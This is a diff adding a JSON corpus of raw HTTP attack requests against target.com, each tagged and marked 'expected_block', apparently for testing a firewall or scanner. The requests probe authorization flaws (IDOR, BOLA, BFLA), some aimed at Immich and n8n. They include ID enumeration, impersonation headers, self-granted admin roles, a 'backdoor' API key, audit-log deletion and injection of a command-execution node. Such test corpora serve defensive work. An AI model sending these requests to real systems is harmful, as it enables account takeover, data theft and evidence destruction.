@@ -1,0 +1,1026 @@
+[
+  {
+      "id": "LOGIC-IDOR-001",
+      "payload": "GET /api/users/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "numeric-id",
+        "quick",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Sequential numeric ID access (user ID 1)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-002",
+      "payload": "GET /api/users/2 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "numeric-id",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Sequential numeric ID access (user ID 2)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-003",
+      "payload": "GET /api/users/100 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "numeric-id"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Higher numeric ID enumeration",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-004",
+      "payload": "GET /api/orders/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "order-id",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Order ID enumeration",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-005",
+      "payload": "GET /api/invoices/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "invoice-id"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Invoice ID enumeration",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-006",
+      "payload": "GET /api/documents/1/download HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "document-access",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Document download via numeric ID",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-007",
+      "payload": "GET /api/users/00000000-0000-0000-0000-000000000001 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "uuid-pattern"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Sequential UUID pattern (all zeros + 1)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-008",
+      "payload": "GET /api/users/11111111-1111-1111-1111-111111111111 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "uuid-pattern"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Predictable UUID pattern (all ones)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-009",
+      "payload": "GET /api/users/12345678-1234-1234-1234-123456789012 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "uuid-sequential"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Sequential UUID pattern",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-010",
+      "payload": "GET /api/messages/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "message-id",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Private message ID enumeration",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-011",
+      "payload": "GET /api/photos/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "photo-id"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Photo/media ID enumeration (Immich-specific)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-012",
+      "payload": "GET /api/albums/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "album-id"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Album ID enumeration (Immich-specific)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-013",
+      "payload": "GET /api/workflows/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "workflow-id",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Workflow ID enumeration (n8n-specific)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-014",
+      "payload": "GET /api/executions/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "execution-id"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Workflow execution ID enumeration (n8n-specific)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-015",
+      "payload": "GET /api/users/admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "username-enum"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Username-based ID enumeration",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-016",
+      "payload": "GET /api/users/me/../1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "path-traversal"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IDOR via path traversal bypass",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-017",
+      "payload": "GET /api/users?id=1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "query-param"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IDOR via query parameter",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-018",
+      "payload": "POST /api/users/profile HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"user_id\":1}",
+      "tags": [
+        "idor",
+        "body-param",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IDOR via POST body parameter",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-019",
+      "payload": "GET /api/users/1/settings HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "nested-resource"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "IDOR on nested resource (user settings)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-020",
+      "payload": "GET /api/users/1/emails HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "sensitive-data",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IDOR accessing sensitive user emails",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-021",
+      "payload": "GET /api/users/1/payment-methods HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "payment-data",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IDOR accessing payment methods",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-022",
+      "payload": "DELETE /api/photos/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "destructive-method",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IDOR with DELETE method on other user's photo",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-023",
+      "payload": "PUT /api/users/1 HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"email\":\"attacker@evil.com\"}",
+      "tags": [
+        "idor",
+        "destructive-method",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IDOR with PUT to modify other user's data",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-024",
+      "payload": "GET /api/assets/1/metadata HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "metadata"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "IDOR on asset metadata (Immich)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-025",
+      "payload": "GET /api/sharing/links/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "sharing-link"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "IDOR on sharing links/tokens",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-026",
+      "payload": "GET /api/credentials/1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "credentials",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IDOR on stored credentials (n8n)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-027",
+      "payload": "GET /api/users/-1 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "negative-id"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Negative ID enumeration (sometimes special)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-028",
+      "payload": "GET /api/users/0 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "zero-id",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Zero ID access (often system/admin user)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-029",
+      "payload": "GET /api/users/999999 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "high-id"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Very high ID enumeration",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "LOGIC-IDOR-030",
+      "payload": "GET /api/users/1,2,3 HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      "tags": [
+        "idor",
+        "multiple-ids"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Multiple ID enumeration in single request",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-API-001",
+      "payload": "GET /api/v1/accounts/1234 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer user_token\r\n\r\n",
+      "tags": ["bola", "api", "account-takeover", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Accessing another user's account via API",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-API-002",
+      "payload": "GET /api/v2/organizations/1/members HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer user_token\r\n\r\n",
+      "tags": ["bola", "api", "org-access", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Accessing organization members list",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-API-003",
+      "payload": "GET /api/v1/tenants/other-tenant/data HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer user_token\r\n\r\n",
+      "tags": ["bola", "multi-tenant", "data-leak", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Cross-tenant data access",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-API-004",
+      "payload": "GET /api/v1/shops/competitor-shop-id/products HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer merchant_token\r\n\r\n",
+      "tags": ["bola", "marketplace", "competitor-access", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Accessing competitor's product list",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-API-005",
+      "payload": "GET /graphql HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\n\r\n{\"query\":\"{ user(id: 1) { email ssn creditCard } }\"}",
+      "tags": ["bola", "graphql", "sensitive-data", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - GraphQL query for other user's PII",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-API-006",
+      "payload": "GET /api/files/private/user_1_secret.pdf HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "file-access", "direct-reference", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Direct file access via predictable name",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-API-007",
+      "payload": "GET /api/exports/report_12345.xlsx HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "export", "report-access", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Accessing another user's exported report",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-API-008",
+      "payload": "GET /api/v1/subscriptions/sub_12345 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "subscription", "billing", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Access to another user's subscription details",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-HEADER-001",
+      "payload": "GET /api/profile HTTP/1.1\r\nHost: target.com\r\nX-User-ID: 1\r\n\r\n",
+      "tags": ["bola", "header-injection", "user-id", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - User ID override via X-User-ID header",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-HEADER-002",
+      "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nX-Account-ID: admin-account-id\r\n\r\n",
+      "tags": ["bola", "header-injection", "account-id", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Account ID override via header",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-HEADER-003",
+      "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nX-Tenant-ID: other-tenant\r\n\r\n",
+      "tags": ["bola", "header-injection", "tenant", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Tenant ID override via header",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-HEADER-004",
+      "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nX-Original-User: admin\r\n\r\n",
+      "tags": ["bola", "header-injection", "impersonation", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - User impersonation via header",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-ROLE-001",
+      "payload": "DELETE /api/admin/users/5 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\n\r\n",
+      "tags": ["bfla", "admin-function", "user-deletion", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Regular user calling admin delete endpoint",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-ROLE-002",
+      "payload": "POST /api/admin/settings HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"debug_mode\":true}",
+      "tags": ["bfla", "admin-function", "settings", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Regular user modifying admin settings",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-ROLE-003",
+      "payload": "POST /api/users/1/role HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"role\":\"admin\"}",
+      "tags": ["bfla", "privilege-escalation", "role-change", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Self-elevation to admin role",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-ROLE-004",
+      "payload": "PUT /api/permissions HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"user_id\":\"me\",\"permissions\":[\"read\",\"write\",\"admin\"]}",
+      "tags": ["bfla", "privilege-escalation", "permissions", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Self-granting additional permissions",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-ROLE-005",
+      "payload": "POST /api/system/backup HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\n\r\n",
+      "tags": ["bfla", "admin-function", "backup", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Triggering system backup (admin function)",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-ROLE-006",
+      "payload": "POST /api/system/restore HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"backup_id\":\"latest\"}",
+      "tags": ["bfla", "admin-function", "restore", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Triggering system restore (admin function)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-ROLE-007",
+      "payload": "GET /api/admin/audit-logs HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\n\r\n",
+      "tags": ["bfla", "admin-function", "audit-logs", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Accessing admin audit logs",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-ROLE-008",
+      "payload": "DELETE /api/admin/audit-logs HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\n\r\n",
+      "tags": ["bfla", "admin-function", "log-tampering", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Deleting audit logs (evidence destruction)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-ROLE-009",
+      "payload": "POST /api/invites HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"email\":\"attacker@evil.com\",\"role\":\"admin\"}",
+      "tags": ["bfla", "invite-abuse", "admin-invite", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Creating admin-level invite",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-ROLE-010",
+      "payload": "POST /api/api-keys HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"name\":\"backdoor\",\"scopes\":[\"admin:*\"]}",
+      "tags": ["bfla", "api-key-abuse", "admin-scope", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Creating API key with admin scopes",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-METHOD-001",
+      "payload": "PUT /api/users/1 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer other_user_token\r\nContent-Type: application/json\r\n\r\n{\"name\":\"Hacked\"}",
+      "tags": ["bfla", "method-override", "put", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - PUT method to modify another user's data",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-METHOD-002",
+      "payload": "PATCH /api/users/1 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer other_user_token\r\nContent-Type: application/json\r\n\r\n{\"email\":\"attacker@evil.com\"}",
+      "tags": ["bfla", "method-override", "patch", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - PATCH to change another user's email",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-METHOD-003",
+      "payload": "POST /api/users/1 HTTP/1.1\r\nHost: target.com\r\nX-HTTP-Method-Override: DELETE\r\nAuthorization: Bearer other_user_token\r\n\r\n",
+      "tags": ["bfla", "method-override-header", "delete", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Method override header to DELETE",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-METHOD-004",
+      "payload": "POST /api/users/1?_method=DELETE HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer other_user_token\r\n\r\n",
+      "tags": ["bfla", "method-override-param", "delete", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - _method parameter override",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-WORKFLOW-001",
+      "payload": "POST /api/workflows/1/activate HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer other_user_token\r\n\r\n",
+      "tags": ["bfla", "n8n", "workflow-activate", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Activating another user's workflow (n8n)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-WORKFLOW-002",
+      "payload": "POST /api/workflows/1/execute HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer other_user_token\r\n\r\n",
+      "tags": ["bfla", "n8n", "workflow-execute", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Executing another user's workflow (n8n)",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-WORKFLOW-003",
+      "payload": "PUT /api/workflows/1 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer other_user_token\r\nContent-Type: application/json\r\n\r\n{\"nodes\":[{\"type\":\"execute-command\",\"command\":\"id\"}]}",
+      "tags": ["bfla", "n8n", "workflow-modify", "rce", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Modifying workflow to inject RCE node",
+      "destructive": true,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-GUID-001",
+      "payload": "GET /api/documents/550e8400-e29b-41d4-a716-446655440000 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "guid", "uuid-enum", "high"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "BOLA - Attempting access with valid-looking UUID",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-GUID-002",
+      "payload": "GET /api/documents/00000000-0000-0000-0000-000000000000 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "guid", "null-uuid", "high"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "BOLA - Null UUID access attempt",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-GUID-003",
+      "payload": "GET /api/documents/ffffffff-ffff-ffff-ffff-ffffffffffff HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "guid", "max-uuid", "high"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "BOLA - Max value UUID access attempt",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-SLUG-001",
+      "payload": "GET /api/posts/admin-secret-post HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "slug", "guessable", "high"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "BOLA - Accessing post via guessable slug",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-SLUG-002",
+      "payload": "GET /api/workspaces/company-internal HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "slug", "workspace", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Accessing workspace via guessable name",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-EMAIL-001",
+      "payload": "GET /api/users?email=admin@company.com HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "email-lookup", "pii", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - User lookup by email address",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-EMAIL-002",
+      "payload": "GET /api/users/by-email/admin@company.com HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "email-lookup", "path-based", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - User lookup via email in path",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-PHONE-001",
+      "payload": "GET /api/users?phone=+1234567890 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "phone-lookup", "pii", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - User lookup by phone number",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-BATCH-001",
+      "payload": "POST /api/users/batch HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\nContent-Type: application/json\r\n\r\n{\"ids\":[1,2,3,4,5,6,7,8,9,10]}",
+      "tags": ["bola", "batch", "mass-enum", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Batch request to enumerate multiple users",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-BATCH-002",
+      "payload": "GET /api/documents?ids=1,2,3,4,5,6,7,8,9,10 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "batch", "query-array", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Multiple IDs in query parameter",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-FILTER-001",
+      "payload": "GET /api/transactions?user_id=1 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "filter-bypass", "user-id", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Filtering by another user's ID",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-FILTER-002",
+      "payload": "GET /api/orders?customer_id=1 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "filter-bypass", "customer-id", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Filtering orders by customer ID",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-FILTER-003",
+      "payload": "GET /api/events?owner_id=admin HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "filter-bypass", "owner-id", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Filtering events by owner ID",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-NESTED-001",
+      "payload": "GET /api/organizations/1/projects/2/tasks/3 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "nested-resource", "deep-access", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Deep nested resource access",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BOLA-NESTED-002",
+      "payload": "GET /api/users/1/wallets/2/transactions/3 HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer attacker_token\r\n\r\n",
+      "tags": ["bola", "nested-resource", "financial", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BOLA - Nested financial resource access",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-IMPERSONATE-001",
+      "payload": "POST /api/admin/impersonate HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nContent-Type: application/json\r\n\r\n{\"target_user_id\":1}",
+      "tags": ["bfla", "impersonation", "admin-function", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Regular user attempting impersonation",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-IMPERSONATE-002",
+      "payload": "GET /api/data HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\nX-Impersonate-User: admin\r\n\r\n",
+      "tags": ["bfla", "impersonation", "header", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Impersonation via header",
+      "destructive": false,
+      "category": "Logic"
+  },
+  {
+      "id": "BFLA-EXPORT-001",
+      "payload": "POST /api/admin/export/users HTTP/1.1\r\nHost: target.com\r\nAuthorization: Bearer regular_user_token\r\n\r\n",
+      "tags": ["bfla", "export", "bulk-data", "critical"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "BFLA - Exporting all user data (admin function)",
+      "destructive": false,
+      "category": "Logic"
+  },
